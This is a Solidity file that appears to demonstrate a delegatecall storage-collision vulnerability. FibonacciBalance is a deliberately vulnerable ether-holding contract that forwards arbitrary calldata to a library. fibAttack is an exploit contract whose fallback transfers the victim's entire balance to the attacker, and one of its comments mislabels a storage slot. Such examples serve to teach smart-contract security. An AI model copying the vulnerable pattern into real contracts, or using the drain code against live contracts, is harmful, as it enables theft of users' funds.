pragma solidity ^0.8.4;
// library contract - calculates fibonacci-like numbers;


contract FibonacciBalance {
    address public fibonacciLibrary;
    // the current fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting fibonacci sequence number
    uint public start = 3;    
    uint public withdrawalCounter;
    // the fibonancci function selector
    string constant fibSig = "setFibonacci(uint256)";
    
    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) payable {
        fibonacciLibrary = _fibonacciLibrary;
    }
    function withdraw() public {
        withdrawalCounter += 1;
        // calculate the fibonacci number for the current withdrawal user
        // this sets calculatedFibNumber
        address payable dest = payable(msg.sender);
        fibonacciLibrary.delegatecall(abi.encodeWithSignature(fibSig, withdrawalCounter));
        dest.transfer(calculatedFibNumber * 1 ether);
    }
    
    // allow users to call fibonacci library functions
    fallback() external {
        fibonacciLibrary.delegatecall(msg.data);
    }
}

contract fibAttack {
    uint storageSlot0; // corresponds to fibonacciLibrary
    uint storageSlot1;
    address payable attacker; // corresponds to calculatedFibNumber
    // fallback - this will run if a specified function is not found
    constructor(){
        attacker = payable(msg.sender);
    }
    fallback() external {
        storageSlot1 = 0;
        // we set calculatedFibNumber to 0, so that if withdraw
        // is called we don't send out any ether. 
        attacker.transfer(address(this).balance); // we take all the ether
    }
 }